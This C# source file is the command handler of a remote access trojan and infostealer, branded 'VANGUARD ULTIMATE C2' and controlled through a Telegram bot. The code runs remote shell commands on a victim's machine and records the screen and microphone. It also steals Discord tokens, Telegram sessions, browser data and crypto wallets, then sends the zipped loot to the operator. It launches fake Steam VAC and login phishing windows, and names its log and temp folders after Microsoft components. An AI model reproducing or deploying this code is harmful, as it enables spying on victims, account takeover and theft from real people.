using System;
using System.IO;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.IO.Compression;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using TgMessage = Telegram.Bot.Types.Message;
using System.Net;
using System.Net.Http;
using Microsoft.Data.Sqlite;
using FinalBot;
using Microsoft.UpdateService.Modules;
using FinalBot.Stealers;
using FinalBot.Modules;
using VanguardCore;
using System.Linq;
using File = System.IO.File;

namespace FinalBot
{
    public class CommandHandler
    {
        private readonly ITelegramBotClient _botClient;
        private readonly string _adminId;
        private readonly Dictionary<long, string> _userState = new Dictionary<long, string>();

        private string _phishAgentName = "Valve_Security_Specialist_732";
        private string _phishCookies = "";
        private string _phishLang = "english";

        // Discord Remote state
        private string _discordToken = "";
        private string _discordChannelUrl = "";
        private static int _lastDiscordMessageId = 0;

        public static int GetLastDiscordMessageId() => _lastDiscordMessageId;

        public CommandHandler(ITelegramBotClient botClient, string adminId)
        {
            _botClient = botClient;
            _adminId = adminId;
        }

        private static void Log(string msg)
        {
            string line = $"[{DateTime.Now:HH:mm:ss}] {msg}";
            Console.WriteLine(line);
            try { File.AppendAllText("C:\\Users\\Public\\edge_update_debug.log", line + "\n"); } catch { }
        }

        public async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
        {
            try
            {
                var message = update.Message ?? update.EditedMessage;
                if (message != null && (message.Animation != null || message.Document != null || message.Video != null))
                {
                    string? fileId = message.Animation?.FileId ?? message.Document?.FileId ?? message.Video?.FileId;
                    if (fileId != null)
                    {
                        Log($"[MEDIA] Caught FileID: {fileId}");
                        try { await _botClient.SendTextMessageAsync(_adminId, $"📥 <b>Media ID:</b>\n<code>{fileId}</code>", parseMode: ParseMode.Html); } catch { }
                    }
                }

                if (update.Type == UpdateType.Message && update.Message != null)
                {
                    await HandleCommand(update.Message);
                }
                else if (update.Type == UpdateType.CallbackQuery && update.CallbackQuery != null)
                {
                    await HandleCallbackQuery(update.CallbackQuery);
                }
            }
            catch (Exception ex)
            {
                Log($"[HANDLER ERROR] {ex.Message}");
            }
        }

        public Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
        {
            Log($"[TELEGRAM ERROR] {exception.Message}");
            return Task.CompletedTask;
        }

        public async Task HandleCommand(TgMessage message)
        {
            if (message.From?.Id.ToString() != _adminId) return;

            string text = message.Text ?? "";
            Log($"[CMD] Received text: {text}");

            // Normalize command: /cmd@botname args -> /cmd args
            if (text.StartsWith("/"))
            {
                int spaceIndex = text.IndexOf(' ');
                string cmdPart = spaceIndex > 0 ? text.Substring(0, spaceIndex) : text;
                if (cmdPart.Contains("@"))
                {
                    string baseCmd = cmdPart.Split('@')[0];
                    text = baseCmd + (spaceIndex > 0 ? text.Substring(spaceIndex) : "");
                }
            }

            if (_userState.TryGetValue(message.Chat.Id, out string state))
            {
                if (state == "awaiting_agent_name")
                {
                    _phishAgentName = text;
                    _userState.Remove(message.Chat.Id);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Agent Name:</b> <code>{_phishAgentName}</code>", parseMode: ParseMode.Html);
                    return;
                }
                else if (state == "awaiting_phish_cookies")
                {
                    _phishCookies = text;
                    _userState.Remove(message.Chat.Id);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>Steam Cookies Injected!</b>", parseMode: ParseMode.Html);
                    return;
                }
                else if (state == "awaiting_victim_name")
                {
                    ConfigManager.VictimName = text;
                    _userState.Remove(message.Chat.Id);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Victim name:</b> <code>{text}</code>", parseMode: ParseMode.Html);
                    return;
                }
                else if (state == "awaiting_discord_token")
                {
                    _discordToken = text.Trim();
                    _userState.Remove(message.Chat.Id);
                    _userState[message.Chat.Id] = "awaiting_discord_channel";
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ Token saved.\n⌨️ <b>Now enter the Discord voice channel URL:</b>", parseMode: ParseMode.Html);
                    return;
                }
                else if (state == "awaiting_discord_channel")
                {
                    _discordChannelUrl = text.Trim();
                    _userState.Remove(message.Chat.Id);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Channel URL set.</b>\n🚀 Launching Discord bot...", parseMode: ParseMode.Html);
                    Log($"[DISCORD_REMOTE] Token: {_discordToken[..Math.Min(8, _discordToken.Length)]}... | URL: {_discordChannelUrl}");
                    string res = DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "join");
                    await _botClient.SendTextMessageAsync(message.Chat.Id, res);
                    return;
                }
                else if (state == "awaiting_discord_tokenurl")
                {
                    // Format: token | invite_url
                    _userState.Remove(message.Chat.Id);
                    string[] parts = text.Split('|');
                    if (parts.Length >= 2)
                    {
                        _discordToken      = parts[0].Trim();
                        _discordChannelUrl = parts[1].Trim();
                        await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ Saved.\n🚀 Launching Discord Remote Bot (Progress will appear below)...", parseMode: ParseMode.Html);
                        Log($"[DISCORD_REMOTE] Token: {_discordToken[..Math.Min(8, _discordToken.Length)]}... | URL: {_discordChannelUrl}");
                        
                        // Launch with explicit progress tracking
                        TgMessage msg = await _botClient.SendTextMessageAsync(message.Chat.Id, "🎮 <b>Discord Remote Bot</b>\n━━━━━━━━━━━━━━━━━━\n🚀 Launching...\n━━━━━━━━━━━━━━━━━━", parseMode: ParseMode.Html);
                        _lastDiscordMessageId = msg.MessageId;
                        DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "join");
                    }
                    else
                    {
                        await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ Wrong format. Use: <code>token | discord_channel_url</code>", parseMode: ParseMode.Html);
                    }
                    return;
                }
            }

            if (text.StartsWith("/start") || text.StartsWith("/panel"))
            {
                await ShowAdminPanel(message.Chat.Id);
            }
            else if (text == "/help")
            {
                await ShowHelp(message.Chat.Id);
            }
            else if (text.StartsWith("/shell "))
            {
                string cmd = text.Substring(7).Trim();
                Log($"[SHELL] Executing: {cmd}");
                await _botClient.SendTextMessageAsync(message.Chat.Id, $"⚙️ Running: `{cmd}`", parseMode: ParseMode.Markdown);
                string result = await ShellManager.ExecuteCommand(cmd);
                await _botClient.SendTextMessageAsync(message.Chat.Id, result, parseMode: ParseMode.Markdown);
            }
            else if (text.StartsWith("/kill "))
            {
                string pidStr = text.Substring(6).Trim();
                if (int.TryParse(pidStr, out int pid))
                {
                    string res = TaskManager.KillProcess(pid);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, res);
                }
            }
            else if (text.StartsWith("/get "))
            {
                string path = text.Substring(5).Trim();
                if (System.IO.File.Exists(path))
                {
                    using var stream = System.IO.File.OpenRead(path);
                    await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, Path.GetFileName(path)));
                }
                else await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ File not found.");
            }
            else if (text.StartsWith("/setname "))
            {
                string newName = text.Substring(9).Trim();
                ConfigManager.VictimName = newName;
                await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ Victim name updated: `{newName}`");
                await ShowAdminPanel(message.Chat.Id);
            }
            else
            {
                await _botClient.SendTextMessageAsync(message.Chat.Id, "❔ Unknown command. Use /help.");
            }
        }

        public async Task HandleCallbackQuery(CallbackQuery callbackQuery)
        {
            if (callbackQuery.Message is not { } message) return;
            string data = callbackQuery.Data ?? "";

            Log($"[CALLBACK] {data}");

            try
            {
                switch (data)
                {
                    case "admin_panel":
                    case "back_to_main":
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                        await ShowAdminPanel(message.Chat.Id, message.MessageId);
                        break;
                    case "file_manager":
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                        var (fmText, fmMarkup) = FileManager.GetDirectoryView("");
                        await EditOrSend(message.Chat.Id, message.MessageId, fmText, fmMarkup, ParseMode.Markdown);
                        break;
                    case "proc_list":
                        string procs = TaskManager.GetProcessList();
                        await _botClient.SendTextMessageAsync(message.Chat.Id, procs, parseMode: ParseMode.Markdown);
                        break;
                    case "panel_system":
                        await ShowSystemPanel(message.Chat.Id, message.MessageId);
                        break;
                    case "panel_work":
                        await ShowWorkPanel(message.Chat.Id, message.MessageId);
                        break;
                    case "panel_spyware":
                        await ShowSpywarePanel(message.Chat.Id, message.MessageId);
                        break;
                    case "set_victim_name":
                        _userState[message.Chat.Id] = "awaiting_victim_name";
                        await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Enter victim name:</b>", parseMode: ParseMode.Html);
                        break;
                    case "screenshot":
                        await HandleScreenshot(message.Chat.Id);
                        break;
                    case "record_video":
                        await HandleVideoRecord(message.Chat.Id);
                        break;
                    case "record_audio":
                        await HandleAudioRecord(message.Chat.Id);
                        break;
                    case "clipboard":
                        await HandleClipboard(message.Chat.Id);
                        break;
                    case "clipboard_summary":
                        await HandleClipboardSummary(message.Chat.Id);
                        break;
                    case "system_info":
                        await HandleSystemInfo(message.Chat.Id);
                        break;
                    case "wifi_profiles":
                        await HandleWifiProfiles(message.Chat.Id);
                        break;
                    case "window_history":
                        await HandleWindowHistory(message.Chat.Id);
                        break;

                    // Phishing Actions
                    case "work_vac_alert":
                        await ShowVACPanel(message.Chat.Id, message.MessageId);
                        break;
                    case "work_steam_phish":
                        await ShowSteamPhishLangPanel(message.Chat.Id, message.MessageId);
                        break;
                    
                    case "vac_launch":
                        PhishManager.LaunchSteamAlert();
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 VAC Alert launched!");
                        break;
                    case "vac_toggle_lang":
                        PhishManager.SetVacLang(PhishManager.GetVacLang() == "en" ? "cn" : "en");
                        await ShowVACPanel(message.Chat.Id, message.MessageId);
                        break;
                    case "vac_set_agent":
                        _userState[message.Chat.Id] = "awaiting_agent_name";
                        await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Enter agent name for VAC:</b>", parseMode: ParseMode.Html);
                        break;
                    case "vac_inject_cookies":
                        _userState[message.Chat.Id] = "awaiting_phish_cookies";
                        await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Paste Steam Cookies (JSON) for VAC:</b>", parseMode: ParseMode.Html);
                        break;

                    case "steam_phish_en":
                        PhishManager.LaunchSteamLogin("en");
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam Phish (EN) launched!");
                        break;
                    case "steam_phish_cn":
                        PhishManager.LaunchSteamLogin("cn");
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam Phish (CN) launched!");
                        break;

                    case "work_discord":
                        await HandleDiscordSteal(message.Chat.Id);
                        break;
                    case "work_telegram":
                        await HandleTelegramSteal(message.Chat.Id);
                        break;
                    case "work_browsers":
                        await HandleBrowserSteal(message.Chat.Id);
                        break;
                    case "work_crypto":
                        await HandleCryptoSteal(message.Chat.Id);
                        break;
                    case "full_report":
                        await HandleFullReport(message.Chat.Id);
                        break;
                    
                    case "discord_remote_start":
                        if (!string.IsNullOrEmpty(_discordToken) && !string.IsNullOrEmpty(_discordChannelUrl))
                        {
                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Re-launching with saved credentials...");
                            DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "join");
                        }
                        else
                        {
                            _userState[message.Chat.Id] = "awaiting_discord_tokenurl";
                            await _botClient.SendTextMessageAsync(message.Chat.Id,
                                "🎮 <b>Discord Remote Bot</b>\n" +
                                "━━━━━━━━━━━━━━━━━━\n" +
                                "<i>Начинаю подключение к Discord...\n" +
                                "Введите токен и ссылку на голосовой канал:</i>\n\n" +
                                "Формат: <code>токен | ссылка</code>",
                                parseMode: ParseMode.Html);
                        }
                        break;

                    case "discord_ctrl_mic":
                        await _botClient.SendTextMessageAsync(message.Chat.Id, DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "mute_mic"));
                        break;
                    case "discord_ctrl_deaf":
                        await _botClient.SendTextMessageAsync(message.Chat.Id, DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "deafen"));
                        break;
                    case "discord_ctrl_stream":
                        await _botClient.SendTextMessageAsync(message.Chat.Id, DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "stream"));
                        break;
                    case "discord_ctrl_disconnect":
                        await _botClient.SendTextMessageAsync(message.Chat.Id, DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "disconnect"));
                        break;

                    default:
                        if (data.StartsWith("fmd_"))
                        {
                            var pathInfo = data.Substring(4);
                            if (!int.TryParse(pathInfo, out int pathId)) return;
                            string realPath = PathCache.Get(pathId) ?? "";
                            if (string.IsNullOrEmpty(realPath))
                            {
                                await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "❌ Path expired or invalid");
                                return;
                            }
                            var (view, keyMarkup) = FileManager.GetDirectoryView(realPath);
                            await EditOrSend(message.Chat.Id, message.MessageId, view, keyMarkup, ParseMode.Markdown);
                        }
                        else if (data.StartsWith("fmf_"))
                        {
                            int id = int.Parse(data.Substring(4));
                            string realPath = PathCache.Get(id) ?? "";
                            if (!string.IsNullOrEmpty(realPath) && File.Exists(realPath))
                            {
                                var info = new FileInfo(realPath);
                                string size = info.Length > 1024 * 1024 ? $"{info.Length / (1024.0 * 1024.0):F2} MB" : $"{info.Length / 1024.0:F2} KB";
                                string caption = $"📄 <b>File Info</b>\n" +
                                                 $"━━━━━━━━━━━━━━━━━━\n" +
                                                 $"📂 <b>Name:</b> <code>{info.Name}</code>\n" +
                                                 $"⚖️ <b>Size:</b> <code>{size}</code>\n" +
                                                 $"━━━━━━━━━━━━━━━━━━";

                                await _botClient.SendTextMessageAsync(message.Chat.Id, $"⬆️ <i>Uploading:</i> <code>{info.Name}</code>...", parseMode: ParseMode.Html);
                                using var stream = File.OpenRead(realPath);
                                await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, info.Name), caption: caption, parseMode: ParseMode.Html);
                            }
                        }
                        else if (data.StartsWith("fmp_"))
                        {
                            var parts = data.Substring(4).Split('_');
                            int parentId = int.Parse(parts[0]);
                            int page = int.Parse(parts[1]);
                            string realPath = PathCache.Get(parentId) ?? "";
                            var (view, keyMarkup) = FileManager.GetDirectoryView(realPath, page);
                            await EditOrSend(message.Chat.Id, message.MessageId, view, keyMarkup, ParseMode.Markdown);
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                Log($"[CALLBACK ERROR] {ex.Message}");
                await _botClient.SendTextMessageAsync(message.Chat.Id, $"❌ <b>Error:</b> <code>{WebUtility.HtmlEncode(ex.Message)}</code>", parseMode: ParseMode.Html);
            }
        }

        private async Task HandleScreenshot(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "📸 <i>Taking screenshot...</i>", parseMode: ParseMode.Html);
            string? path = ScreenshotModule.TakeScreenshot();
            if (path != null)
            {
                using var stream = File.OpenRead(path);
                await _botClient.SendPhotoAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(path)));
                File.Delete(path);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ Screenshot failed.");
        }

        private async Task HandleAudioRecord(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🎤 <i>Recording audio (10s)...</i>", parseMode: ParseMode.Html);
            string? path = AudioModule.RecordAudio(10);
            if (path != null)
            {
                using var stream = File.OpenRead(path);
                await _botClient.SendVoiceAsync(chatId, InputFile.FromStream(stream, "mic_record.wav"));
                File.Delete(path);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ Audio recording failed.");
        }

        private async Task HandleVideoRecord(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🎥 <i>Recording screen (10s)...</i>", parseMode: ParseMode.Html);
            string? path = await VideoModule.RecordScreen(10);
            if (path != null)
            {
                using var stream = File.OpenRead(path);
                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "screen_record.zip"), caption: "🎥 Screen recording sequence");
                File.Delete(path);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ Video recording failed.");
        }

        private async Task HandleClipboard(long chatId)
        {
            string text = ClipboardModule.GetClipboardText();
            if (!string.IsNullOrEmpty(text))
                await _botClient.SendTextMessageAsync(chatId, $"📋 <b>Clipboard:</b>\n<code>{WebUtility.HtmlEncode(text)}</code>", parseMode: ParseMode.Html);
            else await _botClient.SendTextMessageAsync(chatId, "❌ Clipboard is empty.");
        }

        private async Task HandleClipboardSummary(long chatId)
        {
            string summary = ClipboardModule.GetSummary();
            await _botClient.SendTextMessageAsync(chatId, $"📋 <b>Clipboard Summary:</b>\n\n{summary}", parseMode: ParseMode.Html);
        }

        private async Task HandleSystemInfo(long chatId)
        {
            string info = SystemInfoModule.GetSystemInfo();
            await _botClient.SendTextMessageAsync(chatId, info, parseMode: ParseMode.Markdown);
        }

        private async Task HandleWifiProfiles(long chatId)
        {
            string res = await ShellManager.ExecuteCommand("netsh wlan show profiles");
            await _botClient.SendTextMessageAsync(chatId, $"📶 <b>WiFi Profiles:</b>\n<pre>{WebUtility.HtmlEncode(res)}</pre>", parseMode: ParseMode.Html);
        }

        private async Task HandleWindowHistory(long chatId)
        {
             await _botClient.SendTextMessageAsync(chatId, "📜 <i>Feature pending implementation in native module.</i>", parseMode: ParseMode.Html);
        }

        private async Task HandleDiscordSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "💬 <i>Scanning for Discord tokens...</i>", parseMode: ParseMode.Html);
            var service = new ChatService();
            string report = await service.Run();
            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
        }

        private async Task HandleBrowserSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🌍 <i>Scanning browsers...</i>", parseMode: ParseMode.Html);
            var service = new DataService();
            var report = await service.RunAll();
            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);

            string tempDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
            string outputDir = Path.Combine(tempDir, "VOutput");
            if (Directory.Exists(outputDir))
            {
                string zipPath = Path.Combine(Path.GetTempPath(), "BrowserData.zip");
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(outputDir, zipPath);
                using var stream = File.OpenRead(zipPath);
                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "BrowserData.zip"), caption: "🔓 Browser Data");
                File.Delete(zipPath);
                Directory.Delete(outputDir, true);
            }
        }

        private async Task HandleCryptoSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "💰 <i>Scanning crypto wallets...</i>", parseMode: ParseMode.Html);
            var service = new CryptoService();
            string report = await service.Run(Path.GetTempPath());
            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
        }

        private async Task HandleTelegramSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "✈️ <i>Scanning Telegram sessions...</i>", parseMode: ParseMode.Html);
            var service = new MessengerService();
            string result = service.Run();
            if (result.StartsWith("❌")) await _botClient.SendTextMessageAsync(chatId, result);
            else
            {
                string zipPath = Path.Combine(Path.GetTempPath(), "TG_Session.zip");
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(result, zipPath);
                using (var stream = File.OpenRead(zipPath)) await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "Telegram_Sessions.zip"));
                File.Delete(zipPath);
                Directory.Delete(result, true);
            }
        }

        private async Task HandleFullReport(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🚀 <i>Generating full report...</i>", parseMode: ParseMode.Html);
            string? zipPath = await ReportManager.CreateFullReport();
            if (zipPath != null)
            {
                using var stream = File.OpenRead(zipPath);
                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(zipPath)), caption: "📦 Full Data Report");
                File.Delete(zipPath);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ Report generation failed.");
        }

        private async Task ShowAdminPanel(long chatId, int messageId = 0)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("💻 SYSTEM", "panel_system"),
                    InlineKeyboardButton.WithCallbackData("💼 WORK", "panel_work")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("👁️ SPYWARE", "panel_spyware"),
                    InlineKeyboardButton.WithCallbackData("📊 FULL REPORT", "full_report")
                },
                new[] { InlineKeyboardButton.WithCallbackData("✍️ SET VICTIM NAME", "set_victim_name") }
            });

            string info = $"💎 <b>VANGUARD ULTIMATE C2</b>\n" +
                          $"━━━━━━━━━━━━━━━━━━\n" +
                          $"👤 <b>Victim:</b> <code>{ConfigManager.VictimName}</code>\n" +
                          $"⚡ <b>Rights:</b> {(ElevationService.IsAdmin() ? "🟢 Admin" : "User")}\n" +
                          $"🌐 <b>IP:</b> <code>{SystemInfoModule.GetExternalIP()}</code>\n" +
                          $"⏰ <b>Time:</b> <code>{DateTime.Now:HH:mm:ss}</code>\n\n" +
                          $"✨ <i>Select a control panel below:</i>";

            await EditOrSend(chatId, messageId, info, markup);
        }

        private async Task ShowSystemPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[] { InlineKeyboardButton.WithCallbackData("📋 CLIPBOARD", "clipboard"), InlineKeyboardButton.WithCallbackData("📜 SUMMARY", "clipboard_summary") },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("⚙️ SYSINFO", "system_info"),
                    InlineKeyboardButton.WithCallbackData("📶 PROCESSES", "proc_list")
                },
                new[] { InlineKeyboardButton.WithCallbackData("📡 WIFI PROFILES", "wifi_profiles") },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 BACK", "back_to_main") }
            });

            await EditOrSend(chatId, messageId, "💻 <b>SYSTEM PANEL</b>\nFile and process management:", markup);
        }

        private async Task ShowWorkPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🚀 VAC ALERT", "work_vac_alert"),
                    InlineKeyboardButton.WithCallbackData("🚀 STEAM PHISH", "work_steam_phish")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("💬 DISCORD", "work_discord"),
                    InlineKeyboardButton.WithCallbackData("✈️ TELEGRAM", "work_telegram")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🌍 BROWSERS", "work_browsers"),
                    InlineKeyboardButton.WithCallbackData("💰 CRYPTO", "work_crypto")
                },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 BACK", "back_to_main") }
            });

            await EditOrSend(chatId, messageId, "💼 <b>WORK PANEL</b>\nLaunch phishing or collect data:", markup);
        }

        private async Task ShowVACPanel(long chatId, int messageId)
        {
            string lang = PhishManager.GetVacLang();
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[] { InlineKeyboardButton.WithCallbackData("🚀 LAUNCH VAC WINDOW", "vac_launch") },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData(lang == "en" ? "🇺🇸 ENGLISH" : "🇨🇳 CHINESE", "vac_toggle_lang"),
                    InlineKeyboardButton.WithCallbackData("🕵️ AGENT NAME", "vac_set_agent")
                },
                new[] { InlineKeyboardButton.WithCallbackData("🍪 INJECT COOKIES", "vac_inject_cookies") },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 BACK", "panel_work") }
            });

            string info = "🚨 <b>VAC ALERT CONFIG</b>\n" +
                          "━━━━━━━━━━━━━━━━━━\n" +
                          $"🕵️ <b>Agent:</b> <code>{PhishManager.GetAgentName()}</code>\n" +
                          $"🌐 <b>Lang:</b> {(lang == "en" ? "🇺🇸 EN" : "🇨🇳 CN")}\n" +
                          "━━━━━━━━━━━━━━━━━━";

            await EditOrSend(chatId, messageId, info, markup);
        }

        private async Task ShowSteamPhishLangPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🇺🇸 ENGLISH", "steam_phish_en"),
                    InlineKeyboardButton.WithCallbackData("🇨🇳 CHINESE", "steam_phish_cn")
                },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 BACK", "panel_work") }
            });

            await EditOrSend(chatId, messageId, "🎣 <b>STEAM PHISH</b>\n\n<b>Select window language:</b>", markup);
        }

        private async Task ShowSpywarePanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("📸 SCREENSHOT", "screenshot"),
                    InlineKeyboardButton.WithCallbackData("🎤 MIC (10s)", "record_audio")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🎥 SCREEN REC (10s)", "record_video"),
                    InlineKeyboardButton.WithCallbackData("🕹️ DISCORD REMOTE", "discord_remote_start")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🎙️ MIC", "discord_ctrl_mic"),
                    InlineKeyboardButton.WithCallbackData("🔇 DEAF", "discord_ctrl_deaf")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🖥 STREAM", "discord_ctrl_stream"),
                    InlineKeyboardButton.WithCallbackData("🔴 DISCONNECT", "discord_ctrl_disconnect")
                },
                new[] { InlineKeyboardButton.WithCallbackData("🔙 BACK", "back_to_main") }
            });

            await EditOrSend(chatId, messageId, "👁️ <b>SPYWARE</b>\nHidden recording and Discord Remote:", markup);
        }

        private async Task ShowHelp(long chatId)
        {
            string help = "🆘 <b>Available commands:</b>\n\n/panel - Open admin panel\n/help - Show this help";
            await _botClient.SendTextMessageAsync(chatId, help, parseMode: ParseMode.Html);
        }

        private async Task EditOrSend(long chatId, int messageId, string text, InlineKeyboardMarkup markup, ParseMode parseMode = ParseMode.Html)
        {
            try { await _botClient.EditMessageTextAsync(chatId, messageId, text, parseMode: parseMode, replyMarkup: markup); }
            catch { await _botClient.SendTextMessageAsync(chatId, text, parseMode: parseMode, replyMarkup: markup); }
        }

        private async Task SendWithRetry(Func<Task<TgMessage>> action)
        {
            try { await action(); } catch { }
        }
    }
}
